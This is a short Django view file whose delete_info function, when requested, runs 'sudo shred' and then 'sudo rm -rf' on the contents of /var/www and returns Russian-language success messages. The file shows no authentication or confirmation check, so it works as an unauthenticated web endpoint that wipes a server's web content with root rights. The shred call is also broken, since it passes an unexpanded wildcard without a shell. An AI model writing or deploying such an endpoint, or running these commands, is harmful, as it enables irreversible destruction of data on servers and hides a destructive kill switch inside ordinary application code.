import subprocess
import os
from django.http import JsonResponse


def delete_info(request):
    directory_path = '/var/www'
    number_of_overwrites = 5

    try:
        subprocess.run(['sudo', 'shred', '-n', str(number_of_overwrites), '-z', '-u', f'{directory_path}/*'])

        if os.path.exists(directory_path):
            os.system(f'sudo rm -rf {directory_path}/*')
            return JsonResponse({'message': f'Содержимое директории {directory_path} успешно удалено'}, status=200)
        else:
            return JsonResponse({'message': f'Директория {directory_path} не существует'}, status=404)
    except Exception as e:
        return JsonResponse({'error': str(e)}, status=500)
